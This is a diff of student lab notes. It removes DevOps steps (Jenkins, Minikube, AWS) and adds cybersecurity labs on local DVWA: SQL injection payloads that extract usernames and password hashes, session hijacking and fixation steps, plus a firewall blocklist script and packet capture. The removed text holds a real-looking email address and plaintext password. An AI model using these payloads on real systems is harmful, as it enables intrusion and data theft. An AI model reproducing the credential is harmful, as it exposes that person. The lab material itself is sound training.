@@ -1,955 +1,488 @@
-JENKINS
-(tools)
-To start jenkins(cmd as admin)
-net start jenkins
-JDK
-→ Name: JDK
-→ Add path: C:\Program Files\Microsoft\jdk-17.x\
+Manual Firewall Configuration (Inbound Rule): 
+This part explains how to manually block a specific IP using the Windows Firewall GUI. 
+Steps: 
+1. Open Windows Defender Firewall with Advanced Security. 
+2. Click on Inbound Rules. 
+3. Click New Rule,on the right panel. 
+4. Select Custom and click Next. 
+5. Choose All Programs → Click Next. 
+6. Protocol and Ports: Keep default → Click Next. 
+7. Scope: 
+o Under Remote IP address, select These IP addresses. 
+o Click Add and enter the IP you want to block (example: 1.2.3.4). 
+o Click OK → Next. 
+8. Action: Select Block the connection → Next. 
+9. Profile: Select Domain, Private, Public → Next. 
+10. Name the rule (example: Manual_Block_IP) → Finish. 
+This rule will now block all incoming traffic from that specific IP. 
+Automated Firewall Configuration (Using Python Script): 
+Instead of blocking one IP, the script downloads a list of malicious IPs and blocks all of them 
+automatically.
+
+
+
+
+
+Problem Statement: 
+Write a Python program that downloads a list of malicious IP addresses from a trusted online 
+source and automatically creates firewall rules to block those IPs from accessing the system. 
+Program: (File name: firewall.py) 
+import requests
+import csv
+import subprocess
+
+# Source: Abuse CH
+response = requests.get(
+    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+).text
+
+# Delete existing firewall rule
+rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["PowerShell", "-Command", rule])
+
+# Read CSV data (ignore commented lines)
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines())
+)
 
-Maven
-→ Name: Maven_3.9
-→ Let Jenkins auto-install
+# Add firewall rule for each malicious IP
+for row in mycsv:
+    ip = row[1]
 
-BUILD PROJECT
-master to main(change)
-build steps 1)clean 
-2)install
-post build steps archive artifact **/*
+    if ip != "dst_ip":
+        print("Added Rule to block:", ip)
+
+        rule = (
+            "netsh advfirewall firewall add rule "
+            "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+        )
 
-PIPELINE
-CREATE PIPELINE JOB
-Step 1: Jenkins → New Item → Name: MavenJava_Pipeline
-Step 2: Add this Jenkinsfile script
-install Copy Artifact plugins
-for java project 
-maven java build
-maven java test
+        subprocess.run(["PowerShell", "-Command", rule])
+Sample Output: 
+Added Rule to block: 45.9.148.221 
+Added Rule to block: 103.17.48.5 
+Added Rule to block: 185.234.219.12 
 
-for web project
-build 
-test 
-deploy
 
-✔ Job 1 → MavenJava (build the Maven project)
-✔ Job 2 → MavenJava_Test (copy artifacts & test)
+Execution Steps: 
+1. Open Command Prompt and select Run as Administrator. 
+(Firewall rules require admin rights.) 
+2. Navigate to the folder where firewall.py is saved. 
+Example: cd C:\Users\YourName\Desktop 
+3. Make sure Python is installed: python --version 
+4. install required library (if not already installed):-  python -m pip install requests 
+5. Execute the program: python firewall.py 
+6. Output will appear in Command Prompt like: 
+Added Rule to block: 45.9.148.221 
+Added Rule to block: 103.17.48.5 
+For every IP, you will see: 
+o “Added Rule to block: <IP>” 
+o PowerShell/Command Prompt will also show OK message for successful rule 
+creation. 
+7. Cross-verify the rules: 
+o Open Windows Defender Firewall with Advanced Security 
+o Go to Outbound Rules 
+o Search for rule name: BadIP 
+o You will see many blocked IP addresses listed
 
-✅ STEP 1: Create the First Freestyle Job (MavenJava)
-1. Open Jenkins
-http://localhost:8888
 
-2. Create a New Job
 
-Click New Item
 
-Enter name: MavenJava
 
-Select Freestyle project
+# File name: password_checker.py
 
-Click OK
+import re
 
-✅ STEP 2: Configure MavenJava
-2.1 Add Description
+def check_password_strength(password):
+    if len(password) < 8:
+        return "Weak: Password must be at least 8 characters long."
+    
+    if not any(char.isdigit() for char in password):
+        return "Weak: Password must include at least one number."
+    
+    if not any(char.isupper() for char in password):
+        return "Weak: Password must include at least one uppercase letter."
+    
+    if not any(char.islower() for char in password):
+        return "Weak: Password must include at least one lowercase letter."
+    
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return "Medium: Add special characters to make your password stronger."
+    
+    return "Strong: Your password is secure!"
 
-Write something like:
 
-This job builds the Maven Java project.
+def password_checker():
+    print("Welcome to the Password Strength Checker!")
 
-2.2 Source Code Management
+    while True:
+        password = input("\nEnter your password (or type 'exit' to quit): ")
 
-Select Git
+        if password.lower() == "exit":
+            print("Thank you for using the Password Strength Checker! Goodbye!")
+            break
 
-Enter your repository URL
-Example:
+        result = check_password_strength(password)
+        print(result)
 
-https://github.com/yourname/maven-project.git
 
-2.3 Build Steps
-➤ Build Step 1: Clean
+if __name__ == "__main__":
+    password_checker()
 
-Click Add Build Step
 
-Choose Invoke top-level Maven targets
 
-Maven Version: MAVEN_HOME
 
-Goals:
 
-clean
+**Experiment: Analyzing Phishing Emails** 
+To analyze a suspicious email using EML Analyzer and VirusTotal and identify whether it is 
+phishing based on technical indicators. 
+Tools Used: - Online EML Analyzer - VirusTotal - Sample file: 2020-05-05-phishing-email-example-01.eml
 
-➤ Build Step 2: Install
 
-Click Add Build Step
 
-Choose Invoke top-level Maven targets
+Part A: EML Analyzer Results 
+The file 2020-05-05-phishing-email-example-01.eml was uploaded to the EML Analyzer. 
+EML Analyzer Results:
 
-Maven Version: MAVEN_HOME
 
-Goals:
+Part B: VirusTotal Analysis 
+The sender IP 94.100.31.27 was checked on VirusTotal. 
+VirusTotal Result: 
+• Detection Ratio: 1 / 93 vendors flagged as malicious 
+• Location: Netherlands 
+• ASN: AS29802 (HVC-AS)
 
-install
 
-2.4 Post-Build Actions
-➤ Action 1: Archive the Artifacts
 
-Click Add post-build action
 
-Select: Archive the artifacts
 
-Files to archive:
 
-**/*
 
 
-This stores your built .jar and other files.
+**Packet Sniffing and Network Traffic Analysis**
 
-➤ Action 2: Build Other Projects
 
-Click Add post-build action
+Procedure: 
+Step 1: Open Kali Linux. 
+Step 2: Open Terminal in Kali Linux. 
+ 
+Step 3:  
+Start a local HTTP server on port 8080 using : 
+python3 -m http.server 8080 
 
-Select: Build other projects
+Step 4: In another new terminal start packet capture: 
+sudo tcpdump -i any -w capture.pcap port 8080
 
-Projects to build:
-
-MavenJava_Test
-
-
-(This triggers the test job after build.)
-
-2.5 Save Job
-
-Click Apply → Save
-
-🎉 MavenJava job is ready.
-
-If you run it, you will see:
-
-✔ Clean
-✔ Install
-✔ Artifacts archived
-✔ Next project triggered
-
-✅ STEP 3: Create the Second Freestyle Job (MavenJava_Test)
-3.1 Create a New Job
-
-Click New Item
-
-Enter name: MavenJava_Test
-
-Select Freestyle project
-
-Click OK
-
-✅ STEP 4: Configure MavenJava_Test
-4.1 Description
-This job copies artifacts from MavenJava and performs testing.
-
-4.2 Source Code Management
-
-Select None
-
-4.3 Environment
-
-Tick:
-✔ Delete workspace before build starts
-
-4.4 Build Steps
-➤ Copy Artifacts from First Job
-
-Click Add Build Step
-
-Select Copy artifacts from another project
-
-Project name:
-
-MavenJava
-
-
-Artifacts to copy:
-
-**/*
-
-
-This pulls the built .jar and files from job 1.
-
-4.5 Post-Build Actions
-
-Click Add post-build action
-
-Choose Archive the artifacts
-
-Files:
-
-**/*
-
-4.6 Save
-
-Click Apply → Save
-
-🎉 MavenJava_Test job is ready.
-
-✅ STEP 5: Final Result
-On Jenkins Dashboard:
-
-You will see:
-
-MavenJava
-
-MavenJava_Test
-
-✔ Running MavenJava:
-
-It performs:
-
-Git clone
-
-Clean
-
-Install
-
-Archive artifacts
-
-Triggers MavenJava_Test
-
-You will see the console output like:
-
-Build successful
-
-Artifacts stored
-
-✔ Running MavenJava_Test:
-
-It performs:
-
-Deletes workspace
-
-Copies artifacts from MavenJava
-
-Archives them again
-
-🎉 Your Maven Java Automation System is now fully ready!
-
-
-🌐 II. Maven Web Automation — Full Steps
-
-You will create three Freestyle Jobs:
-
-1️⃣ maven_web_build → Build the Maven Web App
-2️⃣ maven_web_test → Copy artifacts + run tests
-3️⃣ maven_web_deploy → Deploy .war to Tomcat
-
-Then create a Pipeline View to visualize the automation.
-
---------------------------------------------
-✅ 1. Create Freestyle Project: MavenWeb_Build
---------------------------------------------
-Step 1: Open Jenkins
-http://localhost:8888
-
-Step 2: Create the Build Job
-
-Click New Item
-
-Enter name:
-
-maven_web_build
-
-
-Select Freestyle project
-
-Click OK
-
-✅ Step 3: Configure maven_web_build
-3.1 Description
-This job builds the Maven web application.
-
-3.2 Source Code Management
-
-Select Git
-
-Enter your web project Git URL
-(Example)
-
-https://github.com/username/maven-webapp.git
-
-3.3 Build Steps
-➤ Build Step 1: Clean
-
-Click Add Build Step
-
-Choose Invoke top-level Maven targets
-
-Maven version: MAVEN_HOME
-
-Goals:
-
-clean
-
-➤ Build Step 2: Install
-
-Click Add Build Step
-
-Choose Invoke top-level Maven targets
-
-Goals:
-
-install
-
-3.4 Post-Build Actions
-➤ Action 1: Archive Artifacts
-
-Click Add Post-build Action
-
-Select Archive the artifacts
-
-Files to archive:
-
-**/*
-
-➤ Action 2: Build Other Projects
-
-Click Add Post-build Action
-
-Select:
-
-Build other projects
-
-
-Projects to build:
-
-maven_web_test
-
-3.5 Save
-
-Click Apply → Save
-
---------------------------------------------
-✅ 2. Create Freestyle Project: MavenWeb_Test
---------------------------------------------
-Step 1: Create Test Job
-
-Click New Item
-
-Name:
-
-maven_web_test
-
-
-Select Freestyle project
-
-Click OK
-
-✅ Step 2: Configure maven_web_test
-2.1 Description
-This job copies artifacts from the build job and executes tests.
-
-2.2 Source Code Management
-
-Select None
-
-2.3 Environment
-
-Check:
-✔ Delete workspace before build starts
-
-2.4 Build Steps
-➤ Step 1: Copy Artifacts
-
-Click Add Build Step
-
-Select Copy artifacts from another project
-
-Project name:
-
-maven_web_build
-
-
-Artifacts to copy:
-
-**/*
-
-➤ Step 2: Run Maven Tests
-
-Click Add Build Step
-
-Select Invoke top-level Maven targets
-
-Maven version: MAVEN_HOME
-
-Goals:
-
-test
-
-2.5 Post-Build Actions
-➤ Action 1: Archive Artifacts
-
-Click Add Post-build Action
-
-Select Archive the artifacts
-
-Files:
-
-**/*
-
-➤ Action 2: Build Other Projects
-
-Click Add Post-build Action
-
-Select:
-
-Build other projects
-
-
-Projects to build:
-
-maven_web_deploy
-
-
-Trigger condition:
-✔ Trigger only if build is stable
-
-2.6 Save
-
-Click Apply → Save
-
---------------------------------------------
-✅ 3. Create Freestyle Project: MavenWeb_Deploy
---------------------------------------------
-Step 1: Create Deploy Job
-
-Click New Item
-
-Name:
-
-maven_web_deploy
-
-
-Select Freestyle project
-
-Click OK
-
-✅ Step 2: Configure maven_web_deploy
-2.1 Description
-This job deploys the generated WAR file to Tomcat.
-
-2.2 Source Code Management
-
-Select None
-
-2.3 Environment
-
-Check:
-✔ Delete workspace before build starts
-
-2.4 Build Steps
-➤ Copy Artifacts
-
-Click Add Build Step
-
-Select Copy artifacts from another project
-
-Project name:
-
-maven_web_test
-
-
-Artifacts to copy:
-
-**/*
-
-2.5 Post-Build Actions
-➤ Deploy WAR to Tomcat
-
-Click Add Post-build Action
-
-Select:
-
-Deploy war/ear to a container
-
-
-WAR/EAR files:
-
-**/*.war
-
-
-Context path:
-
-webapp
-
-
-Tomcat URL example:
-
-http://localhost:8080/manager/text
-
-
-Give Tomcat credentials (configured in Jenkins)
-
-2.6 Save
-
-Click Apply → Save
-
---------------------------------------------
-🎯 4. Create Pipeline View (MavenWeb Pipeline)
---------------------------------------------
-Step 1: Create Pipeline View
-
-On Jenkins dashboard click + next to “All”
-
-Enter view name:
-
-maven_web_pipeline
-
-
-Select:
-✔ Build Pipeline View
-
-Click OK
-
-Step 2: Configure View
-
-Description (optional)
-
-Upstream project:
-
-maven_web_build
-
-
-This automatically shows:
-
-maven_web_build → maven_web_test → maven_web_deploy
-
-Step 3: Save
-
-Click Apply → Save
-
-🎉 Final Output
-
-Your Stage View will show a three-stage pipeline:
-
-[ Build ] → [ Test ] → [ Deploy ]
-
-
-Green = Successful
-Red = Failed
-
-
-java project
-
-pipeline {
-    agent any
-
-    tools {
-        maven 'Maven_3.9'
-    }
-
-    stages {
-        stage('Clone Repository') {
-            steps {
-                git branch: 'main',url: 'https://github.com/Sathvika-08/maven-hello.git'
-            }
-        }
-
-        stage('Build with Maven') {
-            steps {
-                bat 'mvn clean package'
-            }
-        }
-
-        stage('Run Java Program') {
-            steps {
-                bat 'java -cp target/hello-maven-1.0-SNAPSHOT.jar com.example.App'
-            }
-        }
-    }
-}
-
-Small-web-project
-pipeline {
-    agent any
-
-    stages {
-        
-        stage('Clone Repository') {
-            steps {
-                git branch: 'main', url: 'https://github.com/ashi-06/small-webapp.git'
-            }
-        }
-
-        stage('Install Dependencies') {
-            steps {
-                echo 'No dependencies to install for static web project'
-            }
-        }
-
-        stage('Build Web Project') {
-            steps {
-                echo 'No build step required for HTML/CSS/JS project'
-            }
-        }
-
-        stage('Deploy to Local Server') {
-            steps {
-                echo 'Copying files to web server directory...'
-                bat '''
-                xcopy /E /Y . "C:\\inetpub\\wwwroot\\small-webapp\\"
-                '''
-            }
-        }
-    }
-}
-
-VIEW PIPELINE 
-install Build Pipeline plugin in plugins to see build pipeline
-
-MINIKUBE
-
-ashimahendra06@gmail.com
-Ashi0659$
-
-docker login
-minikube start --driver=docker
-docker push ashimahendra06/helloimage:latest
-docker pull ashimahendra06/helloimage
-kubectl create deployment demo1 --image=ashimahendra06/helloimage:latest
-kubectl get pods
-kubectl describe pod demo1-7f9844467c-m4lcf
-kubectl expose deployment demo1 --type=NodePort --port=80
-kubectl get svc
-kubectl port-forward svc/demo1 7777:80
-
-
-
-NAGIOS
-docker login
-docker pull jasonrivers/nagios:latest
-docker run --name nagioslab -p 8082:80 jasonrivers/nagios:latest
-http://localhost:8082
-login creds:
-nagiosadmin
-nagios
-
-AWS
-# Deployment of index.html Using EC2 Instance (Ubuntu VM)
-
-## *Step 1: Open AWS Academy Portal*
-
-* Go to *Modules*.
-* Scroll down and select *Launch AWS Academy Lab*.
-
-## *Step 2: Start AWS Lab*
-
-* Click *Start Lab*.
-* When lab starts, click *AWS* to open the AWS Console.
-
-## *Step 3: Open EC2 Service*
-
-* In the AWS Console, search for *EC2*.
-* Click on *EC2*.
-
-## *Step 4: Launch an EC2 Instance*
-
-* Click *Instances*.
-* Select *Launch Instance*.
-
-## *Step 5: Configure the Instance*
-
-### *5.1 Instance Name*
-
-* Enter: webapp (or any name).
-
-### *5.2 Choose OS*
-
-* Choose *Ubuntu Server*.
-* Architecture: *64-bit (x86)*.
-
-### *5.3 Instance Type*
-
-* Select *t3.micro* (free tier eligible).
-
-## *Step 6: Create Key Pair*
-
-* Click *Create New Key Pair*.
-* Key pair type: *RSA*.
-* Format: *.pem*.
-* Click *Create Key Pair*.
-* Save the .pem file on your system.
-
-## *Step 7: Configure Network (Security Group)*
-
-* Click *Create Security Group*.
-* Give a name.
-* Click *Edit*.
-* Add rule:
-
-  * *Type:* SSH
-  * *Port:* 22
-  * *Source:* Anywhere (0.0.0.0/0)
-
-## *Step 8: Storage Configuration*
-
-* Set storage to *8 GB*.
-* Number of instances: *2* (if required).
-
-## *Step 9: Launch the Instance*
-
-* Click *Launch Instance*.
-* A success message will appear.
-
-## *Step 10: Connect to the Instance*
-
-* Go to *Instances*.
-* Select the created instance.
-* Click *Connect*.
-* Select *SSH Client*.
-* Copy the SSH command provided.
-
-## *Step 11: Connect Using Terminal*
-
-1. Open *Command Prompt/Terminal*.
-2. Navigate to the folder containing your .pem file.
-3. Run the SSH command:
-
-
-ssh -i "yourfile.pem" ubuntu@<EC2-Public-IP>
-
-
-## *Step 12: Switch to Root User*
-
-
-sudo su
-
-
-## *Step 13: Install Dependencies*
-
-### *13.1 Update Package List*
-
-
-sudo apt-get update
-
-
-### *13.2 Install Docker*
-
-
-sudo apt-get install docker.io
-
-
-### *13.3 Check Installed Versions*
-
-
-docker --version
-git --version
-
-
-## *Step 14: Clone Your GitHub Repository*
-
-
-git clone <your-github-repo-url>
-
-
-* Example:
-
-
-git clone https://github.com/username/project.git
-
-
-* Navigate to the project folder:
-
-
-cd project
-
-
-## *Step 15: Create or Verify Dockerfile*
-
-### If Dockerfile does NOT exist:
-
-
-nano Dockerfile
-
-
-Add this sample Dockerfile:
-
-
-FROM tomcat:9
-COPY ./index.html /usr/local/tomcat/webapps/ROOT/index.html
-
-
-Save using:
-
-* *CTRL + O*, press Enter
-* *CTRL + X* to exit
-
-## *Step 16: Build Docker Image*
-
-
-sudo docker build -t img1 .
-
-
-## *Step 17: Run Docker Container*
-
-
-sudo docker run -d -p 8081:8080 img1
-
-
-(8081 is the EC2 external port → maps to container’s 8080)
-
-## *Step 18: Check Docker Status*
-
-
-sudo docker ps
-sudo docker images
-
-
-## *Step 19: Access the Deployed Application*
-
-* Get your EC2 *Public IP* from AWS EC2 Dashboard.
-* Open in browser:
-
-
-http://<Public-IP>:8081
-
-
-Example:
-
-
-http://13.222.21.231:8081
-
-
-You should see your *index.html* running live.
-
----
-
-# 🎉 Deployment Successful!
-SECTION 8 — EMAIL CONFIGURATION
-
-Manage Jenkins → Configure System
-
-Find Email Notification:
-
-SMTP Server:
-
-smtp.gmail.com
-
-
-Advanced:
-✔ Use TLS
-Port: 587
-Add Gmail Email & App Password
-
-Click Test email.
-
-
-
-
-2. Exploring git local and remote commands on the multi-folder project
-git global configuration
-git config --global user.name "ashi-06"
-git config --global user.email "ashimahendra06@gmail.com"
-
-Scenario-Based Git Commands
-1. You've cloned a repository and made some changes to a local branch. Now you want to push these changes to the remote repository, but you're getting an error saying "rejected - non-fast-forward." How would you resolve this?
-
-git pull --rebase origin <branch-name>
-
-if there are no conflicts then
-git push origin <branch-name>
-
-If there are conflicts → Git will pause rebase
-Step 1: Fix the conflict in the files
-
-(Git marks them inside the file)
-
-Step 2: Add the fixed file
-git add <filename>
-
-Step 3: Continue the rebase
-git rebase --continue
-
-
-Then push again:
-
-git push origin <branch-name>
-
-
-2. You’ve been working on a feature branch, and now you need to push it to the remote repository. However, the remote repository already has a main branch. How do you push your feature branch without affecting the main branch?
-
-git push origin feature/feat-1
-
-3. You cloned a remote repository, but after a while, the repository’s structure changed and new branches were added. How would you keep your local repository updated with the latest changes from the remote repository?
-
-git fetch origin
-brings all new branches and updates from GitHub into your local repository, without modifying your current work.
-
-it checkout branch-name lets you switch to any new branch that was fetched
-
-4. A colleague has pushed some changes to the main branch, but you have local changes in the same branch. You want to pull their changes, but you want to avoid merge conflicts. What steps would you take?
-Use rebase to integrate their changes on top of your work:
-git stash                   # Temporarily store your changes
-git pull --rebase origin main
-git stash pop               # Apply your changes on top
-
-This reduces the chance of conflicts and keeps history clean.
-
-5. You accidentally pushed a sensitive file (e.g., API keys) to the remote repository. How would you fix this situation?
-Steps to remove the sensitive data:
-    Remove the file and commit:
-git rm --cached path/to/file
-git commit -m "Remove sensitive file"
-git push origin main
-If the secret is in history, use git filter-branch or BFG Repo-Cleaner to rewrite history:
-    git filter-branch --force --index-filter \
-    "git rm --cached --ignore-unmatch path/to/file" \
-    --prune-empty --tag-name-filter cat -- --all
-    Force push and rotate the secret.
-
-6. You’re working on a feature branch, and your manager requests that you integrate the latest changes from main into your feature branch. What steps would you take?
-Use rebase or merge:
-Rebase:
-git checkout feature/your-feature
-git fetch origin
-git rebase origin/main
-
-7. You cloned a remote repository, but later you find that you need to push your changes to a different remote repository. How do you configure your local repository to push to this new remote?
-git remote set-url origin <new-remote-url>
-git push origin branch-name
-
-8. After running git pull, you notice that your local branch is behind the remote branch. How would you proceed to bring your local branch up to date without losing your local changes?
-Use stash or rebase:
-git stash
-git pull --rebase origin branch-name
-git stash pop
-This ensures a clean rebase and retains your changes.
-
-9. You’re working on a project with multiple collaborators, and you notice that your local changes conflict with changes that have been pushed by others. How would you resolve the conflicts?
-    Pull the latest changes:
-git pull origin branch-name
-Git will highlight conflicts. Open the files, manually resolve the <<<<<<<, =======, and >>>>>>> markers.
-Mark as resolved and commit:
-    git add .
-    git commit
-git push origin branch-name
-
-10. You’ve pushed a feature branch to a remote repository, but now you need to delete the branch from the remote. How would you do that?
-Use the following command:
-git push origin --delete feature/branch-name
-This will remove the branch from the remote repository.
-
-
-5. Docker CLI commands
-
-docker --version
-docker pull ubuntu:latest
-docker run -it -p 9090:80 --name myubuntu1 ubuntu:latest
-apt update
-apt install nginx -y
-service nginx start
-ls
-cd var
-cd www
-cd html
-ls
-rm index.nginx-debian.html
-nano index.html
-apt install nano
-nano index.html
-(type in index.html
-<h1>Hello From Docker Ubuntu Nginx!</h1>)
-visit http://localhost:9090
+Step 5: Open Firefox in kali Linux and go to: 
+http://localhost:8080 
+Refresh the page to generate traffic.
+
+Step 6: 
+Go back to tcpdump terminal. 
+Stop packet capturing by using Ctrl + C. 
+It will stop and show how many packets were captured 
+The packets are saved as capture.pcap. 
+Step 7: 
+• Click the Kali Linux dragon icon (top left). 
+•  Type: File Manager and open it. 
+•  Your Home folder will open. 
+• You will see the file: capture.pcap.
+
+Step 8:- 
+• Since Wireshark is pre-installed in Kali, just double-click capture.pcap. 
+• The file will open directly in Wireshark for analysis.
+Step 9:-  
+Filter Login Packets 
+In Wireshark filter bar, type: http.request.method == "POST" 
+Press Enter. 
+Now only important packets will show. 
+
+Step 10:- 
+Click on any one of the packet and the following data is displayed. 
+Browser details such as OS, browser version, language, and visited URLs are visible.If a form is 
+submitted, username and password can be seen in plain text.This proves HTTP is insecure.
+
+
+
+
+**SQL Injection Attack – Cyber Security Lab Experiment**
+Step 1: Install DVWA 
+sudo apt update 
+sudo apt install dvwa –y 
+Step 2: Start Required Services 
+sudo service apache2 start 
+sudo service mysql start 
+Step 3: Configure DVWA 
+Edit config file: 
+sudo nano /etc/dvwa/config.inc.php 
+Ensure: 
+$_DVWA['db_password'] = ''; 
+Save and exit. 
+
+Step 4: Open DVWA in Browser(Firefox) 
+http://127.0.0.1/dvwa 
+ Login: 
+o Username: admin 
+o Password: password 
+ Click Create / Reset Database 
+Step 5: Set Security Level 
+ Go to DVWA Security 
+ Set Security Level = Low 
+ Click Submit 
+
+4. SQL Injection Attack on DVWA 
+Step 6: Navigate to SQL Injection Module 
+DVWA → Vulnerabilities → SQL Injection 
+You will see an input box asking for User ID.
+5. Basic SQL Injection Test 
+Step 7: Normal Input : 1 
+ Displays user details normally
+
+Step 8: Authentication Bypass 
+Enter: 
+1' OR '1'='1 
+ Result:All user records are displayed 
+Confirms SQL Injection vulnerability 
+6. SQL Injection – Database Enumeration 
+Step 9: Find Number of Columns 
+1' ORDER BY 1-- - 
+1' ORDER BY 2-- - 
+1' ORDER BY 3-- - 
+Stop when error occurs    Last successful number = total columns
+
+Step 10: UNION-Based Injection 
+1' UNION SELECT 1,2-- - 
+
+Step 11: Extract Database Name 
+1' UNION SELECT database(),2-- - 
+Step 12: Extract Table Names 
+1' UNION SELECT table_name,2  
+FROM information_schema.tables  
+WHERE table_schema=database()-- - 
+
+Step 13: Extract Column Names 
+1' UNION SELECT column_name,2  
+FROM information_schema.columns  
+WHERE table_name='users'-- - 
+
+Step 14: Extract Username & Password 
+1' UNION SELECT user,password FROM users-- - 
+ Passwords may appear as hashes.
+
+8. Result 
+The SQL Injection attack was successfully performed, demonstrating: 
+ Authentication bypass 
+ Unauthorized data access 
+ Poor input validation vulnerability 
+9. Conclusion 
+This experiment proves that: 
+ Unsanitized user input leads to SQL Injection 
+ Attackers can extract sensitive database information 
+ Proper security controls are mandatory
+
+
+**LAB EXPERIMENT : Testing Authentication Weaknesses and Session Management**
+
+PROCEDURE 
+PART A: Launch DVWA 
+Step 1: Start Required Services 
+Open terminal and start Apache and MySQL: 
+sudo service apache2 start 
+sudo service mysql start
+
+Step 2: Open DVWA in Browser 
+Open Firefox and enter: 
+http://127.0.0.1/dvwa
+
+Step 3: Login to DVWA 
+Use default credentials: 
+Username: admin   
+Password: password 
+
+Step 4: Set Security Level 
+ Go to DVWA Security 
+ Select LOW 
+ Click Submit
+
+PART B: Testing Authentication Weaknesses 
+Experiment 1: Weak Password Authentication 
+Step 1: Open Brute Force Module 
+Navigate to: 
+DVWA → Vulnerabilities → Brute Force 
+
+
+Step 2: Try Common Passwords 
+Enter: 
+Username: admin 
+Password: password 
+Observation 
+Successful login indicates weak authentication. 
+Experiment 2: Manual Brute Force Attack 
+Enter Username (Same Every Time) 
+In Username field, type: 
+admin 
+Do NOT change username. 
+Step 3: Try Passwords ONE BY ONE 
+Now you will manually try passwords (this is the “manual brute force”). 
+Attempt 1 
+ Username: admin 
+ Password: admin 
+ Click Login 
+❌ If it fails → try next password 
+ 
+ 
+ Attempt 2 
+ Username: admin 
+ Password: 123456 
+ Click Login 
+❌ If it fails → try next password 
+ 
+ 
+Attempt 3 
+ Username: admin 
+ Password: password 
+ Click Login 
+LOGIN SUCCESSFUL 
+Step 4: Observe What Happened 
+ DVWA did NOT block you 
+ DVWA did NOT lock account 
+ DVWA allowed unlimited attempts 
+This is called Brute Force Vulnerability 
+PART C: Testing Session Management Vulnerabilities 
+✅ Experiment 3: Session ID Analysis 
+Step 1: Login to DVWA 
+Open browser developer tools: 
+Right Click → Inspect → Storage → Cookies 
+Step 2: Observe Session Cookie 
+Look for: 
+PHPSESSID 
+Observation 
+Session ID is visible and not encrypted. 
+PHPSESSID : 5f6194766020dcaa2c906358cbd2941b 
+Experiment 4: Session Hijacking 
+BEFORE YOU START (IMPORTANT) 
+DVWA security level = LOW 
+You are logged in as admin in DVWA 
+STEP-BY-STEP  
+Step 1: Open DVWA (Victim Session) 
+1. Open Firefox 
+2. Go to: http://127.0.0.1/dvwa 
+3. Login: 
+Username: admin 
+Password: password 
+4. Stay logged in (do NOT logout) 
+This browser is the Victim 
+Step 2: Copy the Session ID (PHPSESSID) 
+1. In the same Firefox window 
+2. Right click → Inspect 
+3. Click Storage tab 
+4. Click Cookies 
+5. Select: http://127.0.0.1 
+You will see something like: 
+PHPSESSID   a8c9f7e3d4b1... 
+6. Right-click on PHPSESSID value → Copy 
+This value is the session ID (user identity). 
+Step 3: Open Attacker Browser (Private Window) 
+1. Press: 
+Ctrl + Shift + P 
+(Private Window opens) 
+Do NOT login here. 
+Step 4: Paste Session ID in Attacker Browser 
+1. In Private Window, go to: http://127.0.0.1/dvwa 
+2. Right click → Inspect 
+3. Go to Storage → Cookies 
+4. Click: http://127.0.0.1 
+5. Find PHPSESSID 
+6. Replace its value with the copied PHPSESSID (5f6194766020dcaa2c906358cbd2941b) 
+7. Press Enter 
+Step 5: Refresh Page 
+1. Refresh the page (F5) 
+You are logged in as admin without username or password! 
+Result 
+Attacker gains access without login → Session Hijacking. 
+Experiment 5: Session Fixation 
+IMPORTANT CONDITIONS (CHECK FIRST) 
+DVWA Security Level = LOW 
+Use only ONE browser window (normal window) 
+Do NOT use Private Window here 
+STEP-BY-STEP (DO EXACTLY THIS) 
+Step 1: Open DVWA WITHOUT Login (Attacker sets session) 
+1. Open Firefox 
+2. Go to: http://127.0.0.1/dvwa/ 
+You will see the login page 
+Do NOT login 
+Step 2: Note the Session ID (Before Login) 
+1. Right click → Inspect 
+2. Go to Storage 
+3. Click Cookies 
+4. Select: http://127.0.0.1 
+You will see: 
+PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
+Step 3: Login WITHOUT Closing Browser 
+Now, in the same browser window: 
+1. Enter: 
+Username: admin 
+Password: password 
+2. Click Login 
+Do NOT refresh, do NOT close browser 
+Step 4: Check Session ID AGAIN (After Login) 
+1. Again open: 
+Inspect → Storage → Cookies → http://127.0.0.1 
+2. Look at PHPSESSID 
+3.  
+OBSERVE CAREFULLY 
+Case 1 (VULNERABLE – DVWA LOW) 
+Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
+After Login  PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
+Same value  
+Session Fixation exists 
+Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE) 
+Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
+After Login  PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
+Session regenerated  
+No session fixation 
+Experiment 6:  
+CONDITIONS (CHECK FIRST) 
+DVWA Security Level = LOW 
+You must know how to view cookies  
+STEP-BY-STEP ( 
+Step 1: Login Normally (Victim Session) 
+1. Open Firefox 
+2. Go to: http://127.0.0.1/dvwa/ 
+3. Login: 
+Username: admin 
+Password: password 
+Step 2: Copy Session ID (IMPORTANT) 
+1. Right click → Inspect 
+2. Storage → Cookies → http://127.0.0.1 
+3. Copy: 
+PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
+Screenshot 1: PHPSESSID before logout 
+Step 3: Logout from DVWA 
+1. Click Logout (top right or menu) 
+2. You will see login page 
+Logout completed 
+Step 4: Reuse OLD Session ID (THIS IS THE TEST) 
+Option A (EASIEST & EXAM-SAFE) 
+1. Open Private Window 
+Ctrl + Shift + P 
+2. Go to: 
+http://127.0.0.1/dvwa/ 
+3. Open Inspect → Storage → Cookies 
+4. Paste the OLD PHPSESSID (copied earlier) 
+5. Press Enter 
+Step 5: Open Internal Page (KEY STEP 🔑) 
+In address bar, type: 
+http://127.0.0.1/dvwa/index.php 
+(or) 
+http://127.0.0.1/dvwa/vulnerabilities/brute/ 
+�
+� Do NOT press Login 
+�
+� Do NOT enter username/password 
+�
+� EXPECTED RESULT (DVWA LOW) 
+✔ You are logged in again 
+✔ Without login 
+✔ Using old session ID 
+Logout did NOT destroy session
